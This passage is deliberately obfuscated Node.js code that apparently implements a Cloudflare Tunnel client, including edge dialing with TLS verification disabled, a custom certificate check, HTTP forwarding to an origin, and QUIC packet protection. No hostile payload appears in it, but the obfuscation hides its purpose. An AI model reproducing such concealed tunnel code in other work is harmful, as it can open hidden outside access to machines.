                while (!![]) {
                    switch (q[r++]) {
                    case '0':
                        if (k)
                            return;
                        continue;
                    case '1':
                        j['removeListener'](gt(0xbb0), m);
                        continue;
                    case '2':
                        b[gt(0x6db)](o, p);
                        continue;
                    case '3':
                        k = !![];
                        continue;
                    case '4':
                        j[gt(0xd5c)](0x0);
                        continue;
                    }
                    break;
                }
            }, m = o => {
                !k && f['jSmsb'](l, d, o);
            };
        j['on'](gs(0xbb0), m), j['setTimeout'](0x7530, () => j[gs(0x4b0)](new Error(gs(0x8b3)))), j['on']('connect', () => {
            const gu = gs, o = {
                    'xHBmV': function (q, r, s) {
                        return q(r, s);
                    }
                };
            if (!h) {
                f[gu(0x83b)](l, c, j);
                return;
            }
            const p = a0j[gu(0x3ae)]({
                'socket': j,
                'servername': g['hostname']
            });
            p['on'](f[gu(0x3b7)], q => {
                !k && o['xHBmV'](l, d, q);
            }), p['on'](f[gu(0xb5a)], () => {
                l(c, p);
            });
        });
    });
}
function a0aL(a) {
    const gv = a0c4, b = {
            'XIyTK': function (d, f) {
                return d < f;
            },
            'UDDOl': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[gv(0x5d4)](d, a[gv(0x61c)][gv(0xcfc)]); d += 0x2) {
        c[gv(0x21f)]([
            a[gv(0x61c)][d],
            a['rawHeaders'][b[gv(0x6aa)](d, 0x1)]
        ]);
    }
    return c;
}
function a0aM(a, b, c, d, f) {
    const gw = a0c4, g = {
            'sPNPe': function (h, i) {
                return h(i);
            },
            'Yhclm': gw(0xb56),
            'qtYXT': 'https:',
            'pltvJ': function (h, i) {
                return h(i);
            },
            'KmzKM': function (h, i) {
                return h === i;
            },
            'CxVjb': 'host',
            'GkNUE': gw(0x521),
            'fGNXs': gw(0x7d3),
            'PsTql': function (h, i) {
                return h === i;
            },
            'LAPGa': gw(0x985),
            'fuZOU': 'Host',
            'ihrFO': gw(0x3b2),
            'GpCzv': function (h, i) {
                return h(i);
            },
            'VxZYk': function (h, i) {
                return h + i;
            },
            'yOjBE': 'error'
        };
    return new Promise((h, i) => {
        const gx = gw;
        let j;
        try {
            j = new URL(a);
        } catch (q) {
            g[gx(0x531)](i, new Error(g[gx(0xa39)]));
            return;
        }
        if (![
                gx(0xac7),
                g[gx(0xa9e)]
            ][gx(0x38b)](j[gx(0x5a5)]) || !j[gx(0x3cc)]) {
            g[gx(0x2ea)](i, new Error(g['Yhclm']));
            return;
        }
        const k = j[gx(0x5a5)] === g[gx(0xa9e)], l = j[gx(0x694)] || (k ? 0x1bb : 0x50), m = {};
        for (const [r, s] of d) {
            const t = r['toLowerCase']();
            if (g['KmzKM'](t, g[gx(0xa4a)]) || g[gx(0xd2a)](t, g[gx(0x4d9)]) || g[gx(0xd2a)](t, g[gx(0x8c1)]) || g['PsTql'](t, g[gx(0x55a)]))
                continue;
            m[r] = s;
        }
        m[g[gx(0xa33)]] = j[gx(0x920)];
        f[gx(0xcfc)] && (m[g['ihrFO']] = g[gx(0x7fb)](String, f[gx(0xcfc)]));
        const n = c[gx(0x6ec)]('/') ? c : g[gx(0x39c)]('/', c), o = k ? a0h : a0g, p = o[gx(0x98b)]({
                'hostname': j[gx(0x3cc)],
                'port': l,
                'path': n,
                'method': b,
                'headers': m,
                'timeout': 0x7530
            }, u => {
                h({
                    'status': u['statusCode'],
                    'headers': a0aL(u),
                    'body': u
                });
            });
        p['on'](g[gx(0x497)], u => i(u)), p[gx(0xb3a)](f[gx(0xcfc)] ? f : undefined);
    });
}
function a0aN(a) {
    const gy = a0c4, b = {
            'JAfcl': gy(0xb92),
            'WFtBE': function (c, d) {
                return c < d;
            },
            'MeJAO': function (c) {
                return c();
            },
            'OvHrm': 'latin1',
            'ypOKY': function (c, d, f) {
                return c(d, f);
            },
            'dAgrf': function (c, d) {
                return c(d);
            },
            'EnFQd': gy(0xc90),
            'fHyOe': function (c, d) {
                return c > d;
            },
            'nAYnU': function (c, d) {
                return c + d;
            },
            'nYDRn': function (c, d) {
                return c(d);
            },
            'hoXav': 'origin\x20closed\x20before\x20response\x20headers',
            'sXBMX': gy(0xbb0),
            'wWjfR': 'close',
            'IlIrw': function (c) {
                return c();
            },
            'jsPWe': function (c, d) {
                return c(d);
            },
            'DPjya': gy(0x369)
        };
    return new Promise((c, d) => {
        const gz = gy, f = {
                'KnjfX': gz(0x369),
                'zIwcq': b[gz(0x98d)],
                'JOTZC': b['wWjfR'],
                'OGbJM': function (l) {
                    return b['IlIrw'](l);
                },
                'ECgld': function (l, m) {
                    return b['jsPWe'](l, m);
                }
            };
        let g = Buffer['alloc'](0x0);
        const h = () => {
                const gA = gz;
                a[gA(0x92d)](f[gA(0xcfd)], i), a[gA(0x92d)](f[gA(0x486)], j), a[gA(0x92d)](gA(0xb3a), k), a[gA(0x92d)](f[gA(0x62d)], k);
            }, i = l => {
                const gB = gz;
                g = g['length'] ? Buffer['concat']([
                    g,
                    l
                ]) : l;
                const m = g['indexOf'](b[gB(0x314)]);
                if (b[gB(0xd05)](m, 0x0))
                    return;
                b[gB(0x754)](h);
                const n = g['subarray'](0x0, m)[gB(0xa3c)](b['OvHrm']), o = n[gB(0x3ff)]('\x0d\x0a'), p = o[0x0][gB(0x3ff)]('\x20'), q = b['ypOKY'](parseInt, p[0x1], 0xa);
                if (!Number['isInteger'](q)) {
                    b[gB(0x61e)](d, new Error(b[gB(0xd42)]));
                    return;
                }
                const r = [];
                for (let s = 0x1; b[gB(0xd05)](s, o[gB(0xcfc)]); s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[gB(0x7b2)](':');
                    b['fHyOe'](u, 0x0) && r['push']([
                        t['slice'](0x0, u)[gB(0x7e4)](),
                        t['slice'](b[gB(0x63c)](u, 0x1))[gB(0x7e4)]()
                    ]);
                }
                c({
                    'status': q,
                    'headers': r,
                    'rest': g['subarray'](m + 0x4)
                });
            }, j = l => {
                const gC = gz;
                f[gC(0x73f)](h), f[gC(0xb6d)](d, l);
            }, k = () => {
                const gD = gz;
                b[gD(0x754)](h), b[gD(0x1bb)](d, new Error(b[gD(0x7d9)]));
            };
        a['on'](b[gz(0x4a6)], i), a['on'](gz(0xbb0), j), a['on'](gz(0xb3a), k), a['on'](gz(0xd8e), k);
    });
}
function a0aO(a) {
    const gE = a0c4, b = {
            'dgzeG': gE(0x842),
            'DFvjI': function (f, g) {
                return f === g;
            },
            'wkNeA': gE(0x75a),
            'HBFio': 'h2.cftunnel.com',
            'ZKwOO': gE(0x27a),
            'TFjxw': function (f, g) {
                return f !== g;
            },
            'addTN': function (f, g) {
                return f + g;
            },
            'UFOBe': gE(0x711),
            'vAPyX': function (f, g) {
                return f(g);
            },
            'qkqXK': function (f, g) {
                return f + g;
            },
            'mjqlB': 'issuer\x20OU\x20mismatch:\x20',
            'olMSz': gE(0x27e),
            'mDkLU': gE(0xd5f),
            'GCftM': function (f, g) {
                return f(g);
            },
            'ovUNF': gE(0xa88)
        };
    if (!a || !a['issuer'])
        return b['ZKwOO'];
    if (b[gE(0xa8a)](a[gE(0x789)]['O'], 'CloudFlare,\x20Inc.'))
        return b[gE(0xbce)](b[gE(0xab1)], a[gE(0x789)]['O'] || '');
    if (!b['vAPyX'](String, a[gE(0x789)]['OU'] || '')[gE(0x6ec)]('CloudFlare\x20Origin\x20SSL'))
        return b[gE(0xbe4)](b[gE(0x1c2)], a[gE(0x789)]['OU'] || '');
    if (!a['subject'] || a[gE(0xab6)]['CN'] !== b[gE(0x483)])
        return b['mDkLU'];
    const c = b[gE(0x59f)](String, a[gE(0x7a5)] || '')[gE(0x3ff)](',')[gE(0x922)](f => f['trim']()[gE(0xc48)]()), d = c[gE(0x3dd)](f => {
            const gF = gE;
            if (!f['startsWith'](b[gF(0xb30)]))
                return ![];
            const g = f['slice'](0x4);
            return b['DFvjI'](g, gF(0x6f5)) || b[gF(0x769)](g, b['wkNeA']) || g[gF(0x6ec)]('*.') && b[gF(0x69f)][gF(0xd23)](g[gF(0xa40)](0x1));
        });
    if (!d)
        return b['ovUNF'];
    return null;
}
function a0aP(a, b) {
    const gG = a0c4, c = {
            'RKWqP': gG(0x6f5),
            'tqwMi': gG(0xbb0),
            'QQnSD': gG(0x3cd),
            'FZcWX': gG(0xa85),
            'bXmZr': function (h, i) {
                return h !== i;
            },
            'vhteH': gG(0x903),
            'akNrO': function (h, i) {
                return h > i;
            },
            'gaSMn': function (h, i) {
                return h + i;
            },
            'TkLYT': function (h, i) {
                return h + i;
            },
            'goBll': gG(0x526),
            'HIOdA': 'all\x20Cloudflare\x20edges\x20failed:\x20',
            'vHfXX': function (h) {
                return h();
            }
        }, d = a0a8['slice']()[gG(0x97b)](() => Math['random']() - 0.5);
    let f = null;
    const g = async () => {
        const gI = gG, h = {
                'flDzh': function (i, j) {
                    return i + j;
                },
                'yrYvv': c['FZcWX'],
                'vnnOT': function (i, j) {
                    const gH = a0b;
                    return c[gH(0x9f0)](i, j);
                },
                'JORvQ': c[gI(0xb67)],
                'NjtJX': function (i, j) {
                    const gJ = gI;
                    return c[gJ(0x800)](i, j);
                },
                'DSquP': gI(0x4e2)
            };
        for (const i of d) {
            try {
                return await new Promise((j, k) => {
                    const gK = gI, l = a0j[gK(0x3ae)]({
                            'host': i,
                            'port': a0a9,
                            'ALPNProtocols': ['h2'],
                            'servername': c[gK(0x95c)],
                            'rejectUnauthorized': ![]
                        });
                    l[gK(0xd5c)](0x2710, () => l['destroy'](new Error(gK(0x7f7)))), l['on'](c['tqwMi'], k), l['on'](c[gK(0xa9f)], () => {
                        const gL = gK;
                        if (a) {
                            const n = a0aO(l[gL(0x8d4)](![]));
                            if (n) {
                                l['destroy'](new Error(h[gL(0x4b7)](h[gL(0xbd9)], n)));
                                return;
                            }
                        }
                        const m = l['alpnProtocol'];
                        if (m && h[gL(0x580)](m, 'h2')) {
                            l[gL(0x4b0)](new Error(h[gL(0xc13)]));
                            return;
                        }
                        h['NjtJX'](a0bQ, 0x0) ? l[gL(0xd5c)](a0bQ, () => l[gL(0x4b0)](new Error(gL(0x83c)))) : l[gL(0xd5c)](0x0), b[gL(0xb82)](h[gL(0x4b7)](h['flDzh'](h[gL(0xc1e)], i) + ':', a0a9)), j(l);
                    });
                });
            } catch (j) {
                f = j, b[gI(0xb34)](c['gaSMn'](c[gI(0xc0c)](c[gI(0xa37)](c[gI(0x7db)], i), gI(0xdc0)), j));
            }
        }
        throw new Error(c['HIOdA'] + f);
    };
    return c[gG(0x30e)](g);
}
const a0aQ = Buffer['from'](a0c4(0x7ad), a0c4(0xd47)), a0aR = Buffer[a0c4(0x581)](a0c4(0xbab), a0c4(0xd47)), a0aS = Buffer[a0c4(0x6ef)]([
        a0aQ,
        Buffer[a0c4(0x581)]('01', 'latin1')
    ]), a0aT = Buffer['concat']([
        a0aR,
        Buffer[a0c4(0x581)]('01', a0c4(0xaa4))
    ]), a0aU = {
        'http': 0x0,
        'websocket': 0x1,
        'tcp': 0x2
    }, a0aV = a0c4(0xba7), a0aW = a0c4(0x217), a0aX = a0c4(0x417), a0aY = a0c4(0x45e), a0aZ = 0x1, a0b0 = a0c4(0x69c), a0b1 = a0c4(0xd4a), a0b2 = Buffer['from']('38762cf7f55934b34d179ae6a4c80cadccbb7f0a', a0c4(0xd47)), a0b3 = Buffer[a0c4(0x581)](a0c4(0xa7a), a0c4(0xd47)), a0b4 = 0x10, a0b5 = 0x4, a0b6 = 0x4d0, a0b7 = 0x4b0, a0b8 = 0x0, a0b9 = 0x1, a0ba = 0x2, a0bb = [
        a0c4(0x6c1),
        a0c4(0x5ae),
        'one-rtt'
    ], a0bc = {
        'padding': 0x0,
        'ping': 0x1,
        'ack': 0x2,
        'ackEcn': 0x3,
        'resetStream': 0x4,
        'stopSending': 0x5,
        'crypto': 0x6,
        'newToken': 0x7,
        'stream': 0x8,
        'maxData': 0x10,
        'maxStreamData': 0x11,
        'maxStreamsBidi': 0x12,
        'maxStreamsUni': 0x13,
        'newConnectionId': 0x18,
        'retireConnectionId': 0x19,
        'pathChallenge': 0x1a,
        'pathResponse': 0x1b,
        'transportClose': 0x1c,
        'applicationClose': 0x1d,
        'handshakeDone': 0x1e,
        'datagram': 0x30,
        'datagramLen': 0x31
    }, a0bd = {
        'originalDestinationConnectionId': 0x0,
        'maxIdleTimeout': 0x1,
        'statelessResetToken': 0x2,
        'maxUdpPayloadSize': 0x3,
        'initialMaxData': 0x4,
        'initialMaxStreamDataBidiLocal': 0x5,
        'initialMaxStreamDataBidiRemote': 0x6,
        'initialMaxStreamDataUni': 0x7,
        'initialMaxStreamsBidi': 0x8,
        'initialMaxStreamsUni': 0x9,
        'ackDelayExponent': 0xa,
        'maxAckDelay': 0xb,
        'disableActiveMigration': 0xc,
        'activeConnectionIdLimit': 0xe,
        'initialSourceConnectionId': 0xf,
        'retrySourceConnectionId': 0x10,
        'maxDatagramFrameSize': 0x20
    };
function a0be(a) {
    const gM = a0c4, b = {
            'YtnCn': function (d, f) {
                return d(f);
            },
            'yJojB': function (d, f) {
                return d < f;
            }
        }, c = b['YtnCn'](BigInt, a);
    if (b[gM(0x79c)](c, 0x40n))
        return 0x1;
    if (b[gM(0x79c)](c, 0x4000n))
        return 0x2;
    if (c < 0x40000000n)
        return 0x4;
    return 0x8;
}
function a0bf(a) {
    const gN = a0c4, b = {
            'mmBlq': function (j, k) {
                return j(k);
            },
            'gscJY': function (j, k) {
                return j < k;
            },
            'YpYVl': function (j, k) {
                return j > k;
            },
            'IoVZG': function (j, k) {
                return j & k;
            },
            'DFWIQ': function (j, k) {
                return j | k;
            }
        }, c = b[gN(0xb80)](BigInt, a);
    let d, f, g;
    if (c < 0x40n)
        f = 0x1, g = 0x0;
    else {
        if (b[gN(0x1cb)](c, 0x4000n))
            f = 0x2, g = 0x40;
        else
            c < 0x40000000n ? (f = 0x4, g = 0x80) : (f = 0x8, g = 0xc0);
    }
    d = Buffer[gN(0x9b5)](f);
    let h = c;
    for (let j = f - 0x1; b[gN(0xd6d)](j, 0x0); j--) {
        d[j] = b[gN(0xb80)](Number, b[gN(0x71a)](h, 0xffn)), h >>= 0x8n;
    }
    return d[0x0] = b[gN(0xd82)](b[gN(0xb80)](Number, h), g), d;
}
function a0bg(a, b) {
    const gO = a0c4, c = {
            'cJSPr': function (h, j) {
                return h < j;
            },
            'kjEXI': function (h, j) {
                return h - j;
            },
            'mbdOA': function (h, j) {
                return h << j;
            },
            'jRwqF': function (h, j) {
                return h & j;
            },
            'AMewn': function (h, j) {
                return h | j;
            },
            'YEAtD': function (h, j) {
                return h(j);
            },
            'xCITg': function (h, j) {
                return h + j;
            }
        };
    if (c[gO(0x7a6)](c['kjEXI'](a[gO(0xcfc)], b), 0x1))
        return null;
    const d = a[b], f = c[gO(0x286)](0x1, d >> 0x6);
    if (c[gO(0x7a6)](a[gO(0xcfc)] - b, f))
        return null;
    let g = BigInt(c[gO(0x4ee)](d, 0x3f));
    for (let h = 0x1; c[gO(0x7a6)](h, f); h++) {
        g = c[gO(0x633)](g << 0x8n, c['YEAtD'](BigInt, a[c[gO(0x809)](b, h)]));
    }
    return [
        g,
        f
    ];
}
class a0bh {
    constructor() {
        const gP = a0c4;
        this[gP(0xa81)] = [];
    }
    [a0c4(0x405)](a) {
        const gQ = a0c4, b = {
                'JdgNh': function (c, d) {
                    return c & d;
                }
            };
        return this[gQ(0xa81)][gQ(0x21f)](Buffer[gQ(0x581)]([b[gQ(0x895)](a, 0xff)])), this;
    }
    [a0c4(0xd52)](a) {
        const gR = a0c4;
        return this[gR(0xa81)]['push'](Buffer[gR(0xb1d)](a) ? a : Buffer[gR(0x581)](a)), this;
    }
    ['fixed'](a, b) {
        const gS = a0c4, c = {
                'HIrCW': function (f, g) {
                    return f - g;
                },
                'Jqrdd': function (f, g) {
                    return f >= g;
                },
                'pHRqI': function (f, g) {
                    return f(g);
                },
                'qaxYG': function (f, g) {
                    return f & g;
                }
            }, d = Buffer[gS(0x9b5)](b);
        for (let f = c[gS(0x1d2)](b, 0x1); c[gS(0xbe8)](f, 0x0); f--) {
            d[f] = c['pHRqI'](Number, c[gS(0x52b)](a, 0xffn)), a >>= 0x8n;
        }
        return this[gS(0xa81)][gS(0x21f)](d), this;
    }
    ['u8'](a) {
        const gT = a0c4, b = {
                'tCopB': function (c, d) {
                    return c & d;
                }
            };
        return this['parts'][gT(0x21f)](Buffer[gT(0x581)]([b[gT(0x3ee)](a, 0xff)])), this;
    }
    ['u16'](a) {
        const gU = a0c4, b = {
                'qUphm': function (d, f) {
                    return d & f;
                }
            }, c = Buffer[gU(0x9b5)](0x2);
        return c[gU(0x250)](b['qUphm'](a, 0xffff), 0x0), this[gU(0xa81)][gU(0x21f)](c), this;
    }
    [a0c4(0x94e)](a) {
        const gV = a0c4, b = {
                'oUzaM': function (d, f) {
                    return d >>> f;
                }
            }, c = Buffer['alloc'](0x4);
        return c[gV(0xd57)](b['oUzaM'](a, 0x0), 0x0), this[gV(0xa81)]['push'](c), this;
    }
    [a0c4(0x2e4)](a) {
        const gW = a0c4, b = {
                'OBVhY': function (c, d) {
                    return c(d);
                }
            };
        return this[gW(0xa81)][gW(0x21f)](b['OBVhY'](a0bf, a)), this;
    }
    [a0c4(0x68f)]() {
        const gX = a0c4;
        return Buffer[gX(0x6ef)](this['parts']);
    }
}
class a0bi {
    constructor(a) {
        const gY = a0c4;
        this['buffer'] = a, this[gY(0xdaa)] = 0x0;
    }
    get ['remaining']() {
        const gZ = a0c4;
        return this[gZ(0x748)]['length'] - this[gZ(0xdaa)];
    }
    [a0c4(0x405)]() {
        const h0 = a0c4, a = this[h0(0x748)][this[h0(0xdaa)]];
        return this['pos'] += 0x1, a;
    }
    [a0c4(0xad4)]() {
        const h1 = a0c4, a = this[h1(0x748)][h1(0x7f1)](this[h1(0xdaa)]);
        return this[h1(0xdaa)] += 0x2, a;
    }
    ['u24']() {
        const h2 = a0c4, a = this[h2(0x748)][h2(0x904)](this[h2(0xdaa)], 0x3);
        return this[h2(0xdaa)] += 0x3, a;
    }
    [a0c4(0x94e)]() {
        const h3 = a0c4, a = this[h3(0x748)]['readUInt32BE'](this[h3(0xdaa)]);
        return this['pos'] += 0x4, a;
    }
    [a0c4(0xd52)](a) {
        const h4 = a0c4, b = this[h4(0x748)]['subarray'](this[h4(0xdaa)], this['pos'] + a);
        return this[h4(0xdaa)] += a, b;
    }
    [a0c4(0x2e4)]() {
        const h5 = a0c4, a = {
                'LwcXT': function (c, d, f) {
                    return c(d, f);
                },
                'XGzxf': function (c, d) {
                    return c === d;
                },
                'ABelX': h5(0x312)
            }, b = a['LwcXT'](a0bg, this[h5(0x748)], this['pos']);
        if (a['XGzxf'](b, null))
            throw new Error(a['ABelX']);
        return this[h5(0xdaa)] += b[0x1], b[0x0];
    }
    [a0c4(0x469)]() {
        const h6 = a0c4, a = {
                'gfgcC': function (c, d) {
                    return c > d;
                },
                'QAldE': function (c, d) {
                    return c(d);
                }
            }, b = this['varint']();
        if (a['gfgcC'](b, a[h6(0xbe1)](BigInt, Number[h6(0x7c9)])))
            return Number['MAX_SAFE_INTEGER'];
        return Number(b);
    }
}
function a0bj(a, b, c) {
    const h7 = a0c4;
    return a0k[h7(0x66f)](a, b)[h7(0x954)](c)['digest']();
}
function a0bk(a, b, c, d) {
    const h8 = a0c4, f = {
            'GBdmr': function (j, k) {
                return j < k;
            }
        }, g = [];
    let h = Buffer[h8(0x9b5)](0x0), i = 0x1;
    while (f[h8(0xa8c)](g['reduce']((j, k) => j + k[h8(0xcfc)], 0x0), d)) {
        h = a0k['createHmac'](a, b)['update'](Buffer[h8(0x6ef)]([
            h,
            c,
            Buffer['from']([i])
        ]))[h8(0x3a0)](), g[h8(0x21f)](h), i++;
    }
    return Buffer[h8(0x6ef)](g)['subarray'](0x0, d);
}
function a0bl(a, b, c, d, f) {
    const h9 = a0c4, g = {
            'mNcYa': h9(0x52a),
            'yLsUu': h9(0x1bc),
            'WqpJK': function (k, l) {
                return k & l;
            },
            'eZpoo': function (k, l, m, n, o) {
                return k(l, m, n, o);
            }
        }, h = Buffer[h9(0x6ef)]([
            Buffer['from'](g['mNcYa'], g['yLsUu']),
            Buffer[h9(0x581)](c, h9(0x1bc))
        ]), i = d || Buffer[h9(0x9b5)](0x0), j = Buffer[h9(0x6ef)]([
            Buffer[h9(0x581)]([
                g[h9(0x8e0)](f >> 0x8, 0xff),
                g[h9(0x8e0)](f, 0xff)
            ]),
            Buffer[h9(0x581)]([h[h9(0xcfc)]]),
            h,
            Buffer[h9(0x581)]([i['length']]),
            i
        ]);
    return g[h9(0x59a)](a0bk, a, b, j, f);
}
class a0bm {
    constructor(a, b, c) {
        const ha = a0c4, d = {
                'IycOb': function (g, h) {
                    return g === h;
                },
                'tYokz': function (g, h, i, j, k, l) {
                    return g(h, i, j, k, l);
                },
                'IRAjY': 'quic\x20key',
                'bkFht': ha(0x9ec),
                'HqBFv': function (g, h) {
                    return g === h;
                },
                'zvQzv': 'aes-256-ecb',
                'YaUzp': ha(0x881)
            };
        this[ha(0x371)] = a, this[ha(0x9bc)] = b, this[ha(0xb83)] = c;
        const f = d['IycOb'](b, ha(0x6a8)) ? 0x20 : 0x10;
        this['key'] = d['tYokz'](a0bl, a, c, d[ha(0xad3)], Buffer[ha(0x9b5)](0x0), f), this['iv'] = d[ha(0x6fc)](a0bl, a, c, d[ha(0x9bf)], Buffer[ha(0x9b5)](0x0), 0xc), this[ha(0x8c8)] = a0bl(a, c, ha(0x2bb), Buffer[ha(0x9b5)](0x0), f), this[ha(0x1be)] = d['HqBFv'](f, 0x20) ? d[ha(0xbf6)] : d['YaUzp'], this['tagSize'] = 0x10;
    }
    [a0c4(0xadd)](a) {
        const hb = a0c4, b = {
                'BGQyy': function (f, g) {
                    return f(g);
                },
                'fbxsE': function (f, g) {
                    return f < g;
                }
            }, c = Buffer[hb(0x581)](this['iv']);
        let d = b['BGQyy'](BigInt, a);
        for (let f = 0x0; b['fbxsE'](f, 0x8); f++) {
            c[0xb - f] ^= b[hb(0xaa9)](Number, d & 0xffn), d >>= 0x8n;
        }
        return c;
    }
    [a0c4(0x1ef)](a) {
        const hc = a0c4, b = a0k[hc(0x512)](this[hc(0x1be)], this['hpKey'], null);
        return b[hc(0x379)](![]), Buffer[hc(0x6ef)]([
            b[hc(0x954)](a),
            b['final']()
        ])[hc(0xd15)](0x0, 0x5);
    }
    [a0c4(0x5a2)](a, b, c) {
        const hd = a0c4, d = a0k['createCipheriv'](this[hd(0x9bc)], this[hd(0x577)], this['nonce'](a));
        d[hd(0x556)](b);
        const f = Buffer[hd(0x6ef)]([
                d[hd(0x954)](c),
                d[hd(0x6c9)]()
            ]), g = d['getAuthTag']();
        return Buffer[hd(0x6ef)]([
            f,
            g
        ]);
    }
    [a0c4(0xbe9)](a, b, c) {
        const he = a0c4, d = {
                'drvpt': function (g, h) {
                    return g - h;
                }
            }, f = a0k[he(0x54c)](this[he(0x9bc)], this[he(0x577)], this[he(0xadd)](a));
        return f[he(0x556)](b), f[he(0x20f)](c['subarray'](c['length'] - this[he(0xae8)])), Buffer['concat']([
            f[he(0x954)](c[he(0xd15)](0x0, d[he(0xcd9)](c[he(0xcfc)], this[he(0xae8)]))),
            f[he(0x6c9)]()
        ]);
    }
}
function a0bn(a, b) {
    const hf = a0c4, c = {
            'lAdGX': function (f, g, h, i, j, k) {
                return f(g, h, i, j, k);
            }
        }, d = new a0bm(a[hf(0x371)], a[hf(0x9bc)], c['lAdGX'](a0bl, a[hf(0x371)], a[hf(0xb83)], hf(0x6a4), Buffer['alloc'](0x0), a[hf(0xb83)][hf(0xcfc)]));
    return b && (d['hpKey'] = a[hf(0x8c8)]), d;
}
function a0bo(a, b) {
    const hg = a0c4, c = {
            'hTmdh': hg(0x385),
            'KLIhQ': hg(0x6a1),
            'fFyLV': 'server\x20in',
            'OXsGk': hg(0xb9b),
            'NnRRf': function (i, j, k, l, m, n) {
                return i(j, k, l, m, n);
            }
        }, d = c[hg(0x355)], f = a0bj(d, a0b2, a), g = b ? c[hg(0x95a)] : c[hg(0x9b4)], h = b ? c[hg(0x9b4)] : c['KLIhQ'];
    return {
        'send': new a0bm(d, c['OXsGk'], c['NnRRf'](a0bl, d, f, g, Buffer[hg(0x9b5)](0x0), 0x20)),
        'recv': new a0bm(d, hg(0xb9b), c[hg(0x2d4)](a0bl, d, f, h, Buffer[hg(0x9b5)](0x0), 0x20))
    };
}
function a0bp(a, b, c) {
    const hh = a0c4, d = {
            'sBIlC': function (g, h) {
                return g + h;
            },
            'Ezgkr': function (g, h) {
                return g >= h;
            },
            'yTboB': function (g, h) {
                return g < h;
            },
            'tDAhu': function (g, h) {
                return g - h;
            },
            'oDDUP': function (g, h) {
                return g > h;
            }
        }, f = [];
    for (const g of a) {
        const h = g[hh(0x1c6)], i = d['sBIlC'](g[hh(0x1c6)], g[hh(0xcfc)]);
        if (i <= b || d['Ezgkr'](h, c)) {
            f[hh(0x21f)](g);
            continue;
        }
        d[hh(0x261)](h, b) && f['push']({
            'start': h,
            'length': d['tDAhu'](b, h)
        }), d[hh(0xb9f)](i, c) && f[hh(0x21f)]({
            'start': c,
            'length': d['tDAhu'](i, c)
        });
    }
    return f;
}
function a0bq(c, d) {
    const hi = a0c4, f = {
            'GEwsx': function (i, j) {
                return i - j;
            },
            'UFmPR': function (i, j) {
                return i <= j;
            }
        }, g = c[hi(0x6ef)](d)[hi(0x97b)]((i, j) => i[hi(0x1c6)] - j[hi(0x1c6)]), h = [];
    for (const i of g) {
        const j = h[hi(0xcfc)] ? h[f[hi(0x606)](h[hi(0xcfc)], 0x1)] : null, k = i['start'] + i[hi(0xcfc)];
        j && f[hi(0x92e)](i[hi(0x1c6)], j[hi(0x1c6)] + j[hi(0xcfc)]) ? j[hi(0xcfc)] = Math['max'](j['length'], f['GEwsx'](k, j['start'])) : h[hi(0x21f)]({
            'start': i[hi(0x1c6)],
            'length': i[hi(0xcfc)]
        });
    }
    return h;
}
class a0br {
    constructor(a) {
        const hj = a0c4, b = { 'KRRBc': hj(0xba0) }, c = b[hj(0x2b4)]['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[hj(0x369)] = Buffer[hj(0x9b5)](0x0);
                continue;
            case '1':
                this['frontier'] = 0x0;
                continue;
            case '2':
                this[hj(0x31b)] = ![];
                continue;
            case '3':
                this['pending'] = [];
                continue;
            case '4':
                this[hj(0xbea)] = ![];
                continue;
            case '5':
                this[hj(0x521)] = a;
                continue;
            case '6':
                this['unacked'] = [];
                continue;
            }
            break;
        }
    }
    get [a0c4(0xb57)]() {
        const hk = a0c4;
        return this[hk(0x369)][hk(0xcfc)];
    }
    [a0c4(0x9f8)](a, b) {
        const hl = a0c4, c = {
                'seSda': function (d, f) {
                    return d - f;
                }
            };
        a[hl(0xcfc)] && (this[hl(0x369)] = Buffer[hl(0x6ef)]([
            this[hl(0x369)],
            a
        ]), this[hl(0xb0e)]['push']({
            'start': c[hl(0x3da)](this[hl(0x369)][hl(0xcfc)], a[hl(0xcfc)]),
            'length': a['length']
        })), b && (this[hl(0xbea)] = !![], this['finUnacked'] = !![]);
    }
    [a0c4(0xc64)](a) {
        const hm = a0c4, b = {
                'YCuaR': function (g, h) {
                    return g <= h;
                },
                'GMMww': function (g, h) {
                    return g + h;
                },
                'PBLOX': function (g, h) {
                    return g < h;
                },
                'rulls': function (g, h) {
                    return g + h;
                },
                'dDsEk': function (g, h, i) {
                    return g(h, i);
                }
            };
        if (!this[hm(0xb0e)]['length'] || b[hm(0x9d8)](a, 0x0))
            return null;
        const c = this[hm(0xb0e)][0x0], d = Math['min'](c[hm(0xcfc)], a), f = {
                'start': c['start'],
                'length': d
            };
        return c[hm(0x1c6)] += d, c[hm(0xcfc)] -= d, !c[hm(0xcfc)] && this[hm(0xb0e)][hm(0xd5e)](), f[hm(0xd52)] = this[hm(0x369)][hm(0xd15)](f[hm(0x1c6)], b[hm(0xd24)](f[hm(0x1c6)], d)), f[hm(0xc23)] = b[hm(0x516)](f[hm(0x1c6)], this[hm(0x436)]), this[hm(0x436)] = Math[hm(0x23e)](this[hm(0x436)], b[hm(0xb9d)](f[hm(0x1c6)], d)), this[hm(0x5bf)] = b[hm(0x1b0)](a0bq, this[hm(0x5bf)], [{
                'start': f['start'],
                'length': d
            }]), f;
    }
    [a0c4(0x8b9)]() {
        const hn = a0c4;
        if (!this[hn(0xbea)] || !this[hn(0x31b)] || this[hn(0xb0e)][hn(0xcfc)] || this[hn(0x5bf)][hn(0xcfc)])
            return ![];
        return this[hn(0x31b)] = ![], !![];
    }
    [a0c4(0x3fd)](a, b, c) {
        const ho = a0c4, d = {
                'SiTdy': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'KZdcu': function (f, g) {
                    return f >= g;
                },
                'oKdLK': function (f, g) {
                    return f + g;
                }
            };
        this[ho(0x5bf)] = d['SiTdy'](a0bp, this[ho(0x5bf)], a, a + b), c && this[ho(0xbea)] && d[ho(0x245)](d[ho(0x571)](a, b), this[ho(0x369)][ho(0xcfc)]) && (this[ho(0x31b)] = ![]), this[ho(0x521)]['onSendProgress']();
    }
    [a0c4(0x66b)]() {
        const hp = a0c4, a = {
                'OoasS': function (b, c, d) {
                    return b(c, d);
                }
            };
        this[hp(0x5bf)]['length'] && (this[hp(0x436)] = this[hp(0x5bf)][0x0][hp(0x1c6)], this[hp(0xb0e)] = a['OoasS'](a0bq, this[hp(0xb0e)], this[hp(0x5bf)])['sort']((c, d) => c['start'] - d['start']), this['unacked'] = []), this[hp(0xbea)] && (this[hp(0x31b)] = !![]);
    }
    ['lossRanges'](a) {
        const hq = a0c4, b = {
                'KrpMd': function (c, d, f, g) {
                    return c(d, f, g);
                },
